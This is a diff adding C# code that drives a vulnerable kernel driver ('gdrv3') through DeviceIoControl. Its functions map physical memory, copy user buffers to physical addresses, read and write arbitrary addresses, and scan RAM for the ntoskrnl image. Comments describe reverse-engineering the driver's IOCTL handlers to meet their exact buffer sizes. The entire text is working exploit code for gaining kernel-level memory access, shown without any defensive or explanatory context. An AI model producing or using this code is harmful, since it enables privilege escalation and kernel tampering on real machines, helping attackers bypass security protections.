@@ -1,0 +1,110 @@
+        IntPtr inb = Marshal.AllocHGlobal(0x40);
+        IntPtr outb = Marshal.AllocHGlobal(0x40);
+        try
+        {
+            for (int i = 0; i < 0x40; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
+            if (shape == 1) { Marshal.WriteInt64(inb, 0, size); Marshal.WriteInt64(inb, 8, (long)pa); }
+            else { Marshal.WriteInt64(inb, 0, (long)pa); Marshal.WriteInt64(inb, 8, size); }
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102040, inb, (uint)inLen, outb, 0x40, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            byte[] ob = new byte[0x40];
+            Marshal.Copy(outb, ob, 0, 0x40);
+            outHex = Hex(ob);
+            if (!ok) return string.Format("shape{0} FAIL err={1} info={2}", shape, err, got);
+            return string.Format("shape{0} OK info={1}", shape, got);
+        }
+        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
+    }
+    // ---- W3: gdrv3 map (0xC3502004) and copy-user-to-phys (0xC3502808) ------
+    // Contract from the driver decode (gdrv3 RVA 0xA974: `cmp r9,0x10; jne INVALID;
+    // cmp r8,0x10; jne INVALID`): inlen AND outlen must be EXACTLY 0x10 - the old
+    // 0x20/0x20 call was answered with STATUS_INVALID_PARAMETER (87).  in =
+    // { u64 pa, u32 size, u32 pad }; the handler writes the view base back into the
+    // input slot and/or the out buffer, so both are captured.
+    public static string GdrvMapTry(IntPtr h, ulong pa, ulong size, out ulong va, out uint err)
+    {
+        va = 0; err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x10);
+        IntPtr outb = Marshal.AllocHGlobal(0x10);
+        try
+        {
+            for (int i = 0; i < 0x10; i++) { Marshal.WriteByte(inb, i, 0); Marshal.WriteByte(outb, i, 0); }
+            Marshal.WriteInt64(inb, 0, (long)pa);
+            Marshal.WriteInt32(inb, 8, (int)size);
+            uint got;
+            bool ok = DeviceIoControl(h, 0xC3502004, inb, 0x10, outb, 0x10, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            ulong q0 = (ulong)Marshal.ReadInt64(inb, 0);
+            ulong qo = (ulong)Marshal.ReadInt64(outb, 0);
+            if (!ok) return string.Format("FAIL err={0} info={1} in0=0x{2:x} out0=0x{3:x}", err, got, q0, qo);
+            va = (q0 != pa && q0 != 0) ? q0 : qo;
+            return string.Format("OK info={0} in0=0x{1:x} out0=0x{2:x}", got, q0, qo);
+        }
+        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(outb); }
+    }
+
+    public static string GdrvCopyTry(IntPtr h, ulong a, ulong b, uint n, out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x18);
+        try
+        {
+            Marshal.WriteInt64(inb, 0, (long)b);
+            Marshal.WriteInt64(inb, 8, (long)a);
+            Marshal.WriteInt32(inb, 16, (int)n);
+            uint got;
+            // client sends lpOutBuffer=NULL / nOutBufferSize=0 for the copy IOCTL
+            bool ok = DeviceIoControl(h, 0xC3502808, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            return ok ? "OK" : string.Format("FAIL err={0}", err);
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    public static bool CloseHandle2(IntPtr h) { return CloseHandle(h); }
+
+    public static bool IsUserVa(ulong v)
+    {
+        if (v < 0x10000 || v >= 0x00007FFFFFFFFFFF) return false;
+        if ((v & 0xFFF) != 0) return false;
+        return true;
+    }
+
+    public static string ReadAt(ulong va, int n)
+    {
+        try { byte[] b = new byte[n]; Marshal.Copy(new IntPtr((long)va), b, 0, n); return Hex(b); }
+        catch (Exception) { return null; }
+    }
+
+    public static bool WriteAt(ulong va, byte[] data)
+    {
+        try { Marshal.Copy(data, 0, new IntPtr((long)va), data.Length); return true; }
+        catch (Exception) { return false; }
+    }
+    // ---- X1: RAM top + ntoskrnl physical locate (validated by an export) ---
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool GetPhysicallyInstalledSystemMemory(out ulong kb);
+
+    public static ulong RamTop()
+    {
+        ulong kb;
+        if (!GetPhysicallyInstalledSystemMemory(out kb)) return 0;
+        return kb * 1024;
+    }
+
+    // A loader-mapped ntoskrnl PE, validated by finding a real export name in
+    // its export table.  hal.dll/win32k are filtered by SizeOfImage.
+    public static string ScanNtoskrnl(IntPtr g, ulong ramTop, ulong limit, out string hits)
+    {
+        hits = "";
+        ulong top = Math.Min(ramTop, limit);
+        byte[] chunk;
+        for (ulong pa = 0x100000; pa < top; pa += 0x10000)
+        {
+            if (!InRam(pa, ramTop)) continue;
+            chunk = GdrvRead(g, pa, 0x10000);
+            for (int o = 0; o < 0x10000; o += 0x1000)
+            {
+                if (chunk[o] != 0x4D || chunk[o + 1] != 0x5A) continue;      // MZ
+                uint e_lfanew = BitConverter.ToUInt32(chunk, o + 0x3C);
